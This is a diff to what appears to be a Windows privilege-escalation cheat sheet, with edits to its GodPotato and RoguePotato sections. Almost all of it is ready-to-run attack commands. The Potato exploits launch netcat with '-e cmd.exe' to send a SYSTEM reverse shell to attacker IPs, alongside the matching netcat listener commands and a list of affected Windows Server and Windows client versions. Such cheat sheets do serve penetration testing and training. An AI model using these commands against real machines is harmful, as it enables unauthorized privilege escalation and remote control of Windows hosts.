@@ -262,17 +262,19 @@ whoami
 ImpersonatePrivilege permission required
 ```
 GodPotato-NET4.exe
-GodPotato.exe -cmd "cmd /c whoami"
-GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
+GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.1.102(LHOST) 2012(LPORT)"
+nc.exe -nlvp 2012
 
 Affected version:
 Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
 ```
 ##### Rogue Potato
 ```
-RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999(pick any port)
+RoguePotato.exe -r 10.10.10.3(LHOST) -e "nc.exe 10.10.10.3 3001 -e cmd.exe" -l 9999
 # In some old versions you need to use the "-f" param
 RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
+
+nc.exe -nlvp 3001
 ```
 ##### PowerUp.ps1
 ```
